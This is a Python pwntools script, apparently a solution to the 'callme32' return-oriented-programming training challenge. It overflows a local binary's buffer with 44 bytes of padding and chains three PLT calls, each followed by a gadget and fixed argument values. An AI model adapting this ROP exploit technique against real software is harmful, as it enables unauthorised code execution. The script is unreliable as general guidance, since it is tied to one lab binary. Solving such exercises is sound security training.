from pwn import *

binary = './callme32'
elf = context.binary = ELF(binary)

p = process(binary)

p.recv()

gadget = p32(0x080487f9) # : pop esi ; pop edi ; pop ebp ; ret


payload = b'a'*44
payload+= p32(elf.plt.callme_one)
payload+= gadget
payload+= p32(0xdeadbeef)
payload+= p32(0xcafebabe)
payload+= p32(0xd00df00d)
payload+= p32(elf.plt.callme_two)
payload+= gadget
payload+= p32(0xdeadbeef)
payload+= p32(0xcafebabe)
payload+= p32(0xd00df00d)
payload+= p32(elf.plt.callme_three)
payload+= gadget
payload+= p32(0xdeadbeef)
payload+= p32(0xcafebabe)
payload+= p32(0xd00df00d)

p.sendline(payload)

p.interactive()